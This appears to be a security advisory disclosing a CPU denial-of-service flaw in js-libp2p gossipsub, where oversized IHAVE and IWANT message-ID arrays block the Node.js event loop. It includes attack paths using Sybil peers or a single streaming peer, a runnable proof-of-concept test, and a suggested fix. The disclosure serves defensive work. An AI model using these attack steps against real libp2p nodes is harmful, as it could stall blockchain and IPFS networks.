summary: "libp2p: CPU DoS via oversized IHAVE and IWANT control message arrays\n### Summary\n\
  gossipsub processes IHAVE and IWANT control messages by iterating every received message ID\
  \ synchronously before doing anything with the results. There is no cap on how many IDs a\
  \ single frame may contain. The default LP frame limit is 4MB, which fits roughly 180,000\
  \ message IDs. Iterating that many IDs blocks the Node.js event loop for around 200ms per\
  \ call.\n\nThe two variants have different severity. For IHAVE there is a per-peer per-heartbeat\
  \ counter that limits each peer to one full iteration per heartbeat, so causing a total stall\
  \ requires around 10 Sybil peers. For IWANT there is no equivalent counter at all, so a single\
  \ peer continuously streaming 4MB frames can hold the event loop above 80% utilisation indefinitely.\n\
  \n### Details\n### No decode-time cap on message ID count (`message/decodeRpc.ts:11-19`)\n\
  ```typescript                                                                            \
  \                 \nexport const defaultDecodeRpcLimits: DecodeRPCLimits = {\n  maxSubscriptions:\
  \ Infinity,\n  maxMessages: Infinity,\n  maxIhaveMessageIDs: Infinity,\n  maxIwantMessageIDs:\
  \ Infinity,\n  maxIdontwantMessageIDs: Infinity,\n  maxControlMessages: Infinity,\n  maxPeerInfos:\
  \ Infinity\n}\n```\n\nThese are the defaults unless the operator explicitly overrides `opts.decodeRpcLimits`.\
  \ A `TODO` at `gossipsub.ts:857` already notes the gap: `// TODO: Check max gossip message\
  \ size, before decodeRpc()`.\n\n### IHAVE iterates all IDs before truncating (`gossipsub.ts:1311-1327`)\n\
  \n```typescript                                                                          \
  \                                                                                        \
  \                                       \nmessageIDs.forEach((msgId) => {                \
  \                                                            \n  const msgIdStr = this.msgIdToStrFn(msgId)\
  \                                                               \n  if (!this.seenCache.has(msgIdStr))\
  \ {                                                                     \n    iwant.set(msgIdStr,\
  \ msgId)                                                                            \n  }\
  \                                                                                        \
  \               \n})                                                                     \
  \                                   \n// truncation to GossipsubMaxIHaveLength (5000) only\
  \ happens after the loop finishes                      \n```\n\nThe per-peer flood counters\
  \ (`iasked`, `peerhave`) do cap things eventually: each peer is limited to 10 IHAVE RPCs and\
  \ 5000 IDs counted per heartbeat. After the first oversized IHAVE from a peer, subsequent\
  \ ones are rejected cheaply. The problem is that the cap is per peer, so 10 Sybil peers each\
  \ sending one 180K-ID IHAVE per heartbeat gives 10 x 150ms = 1500ms of synchronous work against\
  \ a 1000ms heartbeat interval.\n\n### IWANT has no rate limit at all (`gossipsub.ts:1377-1394`)\n\
  ```typescript                                        \nmessageIDs?.forEach((msgId) => {  \
  \                   \n  const msgIdStr = this.msgIdToStrFn(msgId)          \n  const entry\
  \ = this.mcache.getWithIWantCount(msgIdStr, id)                                          \
  \     \n  // ...                                                                         \
  \                         \n})                                                           \
  \                                             \n```\n\nUnlike IHAVE, `handleIWant` has no\
  \ `peerhave` or `iasked` equivalent. A single peer can send IWANT RPCs continuously with no\
  \ per-heartbeat limit. Sending IWANT for non-existent messages does not affect the attacker's\
  \ score (`onIwantRcv` is metrics-only), so there is no automatic disconnect. At 1 Gbps a 4MB\
  \ frame arrives every ~32ms and takes ~135ms to process, giving roughly 81% event-loop utilisation\
  \ from a single connection.\n\n### Attack Paths\n**IHAVE (requires ~10 Sybil peers)**\nThe\
  \ attacker connects 10 peers, each subscribing to a topic the victim is on. New peers start\
  \ at score 0, which is above the default `gossipThreshold` of -10, so IHAVE processing is\
  \ active immediately. Each peer sends one 4MB RPC per heartbeat containing a single `ControlIHave`\
  \ entry with ~180,000 random message IDs. The victim processes all 180,000 IDs per peer before\
  \ the counter kicks in for that peer. Total event-loop block: around 1500ms per 1000ms heartbeat.\n\
  \n**IWANT (single peer, no Sybil)**\nThe attacker connects once and streams 4MB IWANT RPCs\
  \ continuously, each containing ~180,000 random message IDs that do not exist in the victim's\
  \ cache. No rate limit applies. At datacenter bandwidth the event loop stays above 80% utilisation\
  \ indefinitely.\n\n### PoC\nSetup and execution of PoC\n```bash                          \
  \                    \ngit clone https://github.com/libp2p/js-libp2p.git\ncd js-libp2p   \
  \                                      \nnpm install                                     \
  \     \ncd packages/gossipsub                                \nnpx aegir build           \
  \                           \nnode --experimental-vm-modules ../../node_modules/.bin/mocha\
  \ 'dist/test/poc.spec.js' --timeout 30000                                             \n```\n\
  PoC Content:\n```typescript\nimport { stop } from '@libp2p/interface'\nimport assert from\
  \ 'node:assert'\nimport { performance } from 'node:perf_hooks'\nimport { encode as lpEncode\
  \ } from 'it-length-prefixed'\nimport { pEvent } from 'p-event'\nimport { RPC } from '../src/message/rpc.js'\n\
  import { GossipsubMaxIHaveMessages, GossipsubMaxIHaveLength, GossipsubHeartbeatInterval }\
  \ from '../src/constants.js'\nimport { createComponents, connectPubsubNodes } from './utils/create-pubsub.js'\n\
  import type { GossipSubAndComponents } from './utils/create-pubsub.js'\n\nconst TOPIC = 'poc-ihave-flood'\n\
  const MSG_ID_BYTES = 20\n// 4 MB LP limit / ~22 bytes per message ID (1-byte tag + 1-byte\
  \ len + 20 bytes)\nconst MSG_IDS_PER_IHAVE = 180_000\n\nfunction randomMsgIds (count: number):\
  \ Uint8Array[] {\n  return Array.from({ length: count }, () => {\n    const id = new Uint8Array(MSG_ID_BYTES)\n\
  \    crypto.getRandomValues(id)\n    return id\n  })\n}\n\ndescribe('CPU DoS via oversized\
  \ IHAVE and IWANT control message arrays', function () {\n  this.timeout(30_000)\n\n  let\
  \ victim: GossipSubAndComponents\n  let attacker: GossipSubAndComponents\n\n  beforeEach(async\
  \ () => {\n    ;[victim, attacker] = await Promise.all([\n      createComponents({ init: {\
  \ allowPublishToZeroTopicPeers: true } }),\n      createComponents({ init: { allowPublishToZeroTopicPeers:\
  \ true } })\n    ])\n\n    // Both subscribe to the topic so the victim builds a mesh entry\n\
  \    victim.pubsub.subscribe(TOPIC)\n    attacker.pubsub.subscribe(TOPIC)\n\n    await connectPubsubNodes(victim,\
  \ attacker)\n\n    // Wait for one heartbeat so the victim's mesh includes the attacker\n\
  \    await pEvent(victim.pubsub, 'gossipsub:heartbeat')\n  })\n\n  afterEach(async () => {\n\
  \    await stop(\n      victim.pubsub, attacker.pubsub,\n      ...Object.values(victim.components),\n\
  \      ...Object.values(attacker.components)\n    )\n  })\n\n  it('BYPASS: single IHAVE with\
  \ 180K message IDs blocks event loop for ~135ms', async () => {\n    const attackerIdStr =\
  \ attacker.components.peerId.toString()\n\n    // Verify attacker is in victim's mesh (required\
  \ for handleIHave to iterate IDs)\n    const meshPeers = (victim.pubsub as any).mesh.get(TOPIC)\
  \ as Set<string> | undefined\n    if (meshPeers == null || !meshPeers.has(attackerIdStr))\
  \ {\n      // Force mesh membership for the PoC if heartbeat hasn't built it yet\n      if\
  \ (meshPeers == null) {\n        (victim.pubsub as any).mesh.set(TOPIC, new Set([attackerIdStr]))\n\
  \      } else {\n        meshPeers.add(attackerIdStr)\n      }\n    }\n\n    const messageIDs\
  \ = randomMsgIds(MSG_IDS_PER_IHAVE)\n\n    // Invoke handleIHave directly\n    const t0 =\
  \ performance.now()\n    const iwant = (victim.pubsub as any).handleIHave(\n      attackerIdStr,\n\
  \      [{ topicID: TOPIC, messageIDs }]\n    ) as Array<{ messageIDs: Uint8Array[] }>\n  \
  \  const elapsed = performance.now() - t0\n\n    console.log(`\\n[PoC] 1 IHAVE × ${MSG_IDS_PER_IHAVE.toLocaleString()}\
  \ IDs: ${elapsed.toFixed(0)} ms event-loop block`)\n    console.log(`[PoC] Response capped\
  \ at: ${iwant[0]?.messageIDs?.length ?? 0} IWANTs (limit: ${GossipsubMaxIHaveLength})`)\n\
  \    console.log(`[PoC] Heartbeat interval:  ${GossipsubHeartbeatInterval} ms`)\n\n    //\
  \ The blocking time should be significant (>>10ms) for a meaningful DoS\n    assert.ok(elapsed\
  \ > 50,\n      `expected >50ms event-loop block for ${MSG_IDS_PER_IHAVE} IDs, got ${elapsed.toFixed(0)}ms`)\n\
  \n    // Victim caps the response regardless of how many IDs were iterated\n    assert.ok(\n\
  \      iwant[0]?.messageIDs?.length <= GossipsubMaxIHaveLength,\n      `response should be\
  \ capped at ${GossipsubMaxIHaveLength}`\n    )\n  })\n\n  it('MULTI-PEER: N peers × 1 IHAVE\
  \ each, iasked resets per peer, total block scales linearly', async () => {\n    const N_PEERS\
  \ = 10\n    const messageIDs = randomMsgIds(MSG_IDS_PER_IHAVE)\n\n    // Ensure mesh includes\
  \ a placeholder topic so !this.mesh.has(topicID) passes\n    const fakeMeshPeers: Set<string>\
  \ = new Set()\n    ;(victim.pubsub as any).mesh.set(TOPIC, fakeMeshPeers)\n\n    let totalElapsed\
  \ = 0\n\n    for (let i = 0; i < N_PEERS; i++) {\n      // Each \"Sybil\" peer uses a unique\
  \ peer ID string\n      const fakePeerId = `12D3KooW${i.toString().padStart(36, '0')}`\n \
  \     fakeMeshPeers.add(fakePeerId)\n\n      // Fresh counters: simulates a peer the victim\
  \ hasn't seen this heartbeat\n      ;(victim.pubsub as any).peerhave.delete(fakePeerId)\n\
  \      ;(victim.pubsub as any).iasked.delete(fakePeerId)\n      // Score defaults to 0 (>\
  \ gossipThreshold of -10): no score entry needed\n\n      const t0 = performance.now()\n \
  \     ;(victim.pubsub as any).handleIHave(fakePeerId, [{ topicID: TOPIC, messageIDs }])\n\
  \      const elapsed = performance.now() - t0\n\n      totalElapsed += elapsed\n      process.stdout.write(`\
  \  peer ${i + 1}/${N_PEERS}: ${elapsed.toFixed(0)} ms\\n`)\n    }\n\n    const ratio = totalElapsed\
  \ / GossipsubHeartbeatInterval\n    console.log(`\\n[PoC] ${N_PEERS} peers × ${MSG_IDS_PER_IHAVE.toLocaleString()}\
  \ IDs: ${totalElapsed.toFixed(0)} ms total`)\n    console.log(`[PoC] Heartbeat interval: \
  \                   ${GossipsubHeartbeatInterval} ms`)\n    console.log(`[PoC] Ratio (block\
  \ / heartbeat):             ${ratio.toFixed(2)}x`)\n    console.log(`[PoC] Attacker cost:\
  \ ${N_PEERS} × 4 MB = ${N_PEERS * 4} MB/s outbound`)\n    console.log(`[PoC] Each peer's iasked\
  \ resets at heartbeat — sustainable indefinitely`)\n\n    // 10 peers should easily exceed\
  \ the 1s heartbeat interval\n    assert.ok(\n      totalElapsed > GossipsubHeartbeatInterval\
  \ * 0.9,\n      `expected ${N_PEERS} peers to block ≥ ${GossipsubHeartbeatInterval * 0.9}\
  \ ms, got ${totalElapsed.toFixed(0)} ms`\n    )\n  })\n\n  it('ENCODE: crafted 180K-ID IHAVE\
  \ RPC fits within 4 MB LP frame limit', () => {\n    const messageIDs = randomMsgIds(MSG_IDS_PER_IHAVE)\n\
  \n    const rpc = RPC.encode({\n      subscriptions: [],\n      messages: [],\n      control:\
  \ {\n        ihave: [{ topicID: TOPIC, messageIDs }],\n        iwant: [],\n        graft:\
  \ [],\n        prune: [],\n        idontwant: []\n      }\n    })\n\n    const MAX_LP_BYTES\
  \ = 4 * 1024 * 1024  // DEFAULT_MAX_DATA_LENGTH from it-length-prefixed\n\n    console.log(`\\\
  n[PoC] Serialised RPC size: ${(rpc.byteLength / (1024 * 1024)).toFixed(2)} MB`)\n    console.log(`[PoC]\
  \ LP frame limit:      ${MAX_LP_BYTES / (1024 * 1024)} MB`)\n    console.log(`[PoC] Fits in\
  \ one frame:   ${rpc.byteLength <= MAX_LP_BYTES ? 'YES ✓' : 'NO ✗'}`)\n    console.log(`[PoC]\
  \ defaultDecodeRpcLimits.maxIhaveMessageIDs = Infinity (no decode-level cap)`)\n\n    assert.ok(rpc.byteLength\
  \ <= MAX_LP_BYTES,\n      `crafted RPC (${rpc.byteLength} bytes) must fit in the 4 MB LP default\
  \ — confirms no LP-level protection`)\n  })\n})\n```\n\nThe IWANT variant has the same per-frame\
  \ timing but does not need Sybil peers. A separate IWANT PoC can be provided on request.\n\
  \n### Impact\nAny node running `@libp2p/gossipsub` with default options that accepts inbound\
  \ connections is affected. This includes Ethereum consensus clients using js-libp2p (Lodestar),\
  \ IPFS nodes with pubsub enabled, and anything calling `createLibp2p({ services: { pubsub:\
  \ gossipsub() } })`.\n\nWith 10 Sybil peers the IHAVE variant blocks the event loop for 1.5x\
  \ the heartbeat interval continuously. The node cannot forward messages, run its heartbeat,\
  \ or respond to legitimate peers. The IWANT variant achieves the same result from a single\
  \ connection at datacenter bandwidth.\n\nNodes that explicitly configure `opts.decodeRpcLimits`\
  \ with finite values are not affected.\n\n## Suggested fix\n\nSet finite defaults in `decodeRpc.ts`:\n\
  ```typescript\nexport const defaultDecodeRpcLimits: DecodeRPCLimits = {\n  maxSubscriptions:\
  \ 128,\n  maxMessages: 256,                                                              \
  \                                                                                        \
  \                                                                            \n  maxIhaveMessageIDs:\
  \ 5_000,\n  maxIwantMessageIDs: 5_000,                                \n  maxIdontwantMessageIDs:\
  \ 5_000,\n  maxControlMessages: 128,\n  maxPeerInfos: 16\n}\n```\n\nSetting `maxIhaveMessageIDs`\
  \ and `maxIwantMessageIDs` to 5000 (matching `GossipsubMaxIHaveLength`) bounds the iteration\
  \ cost to the response limit rather than attacker input."
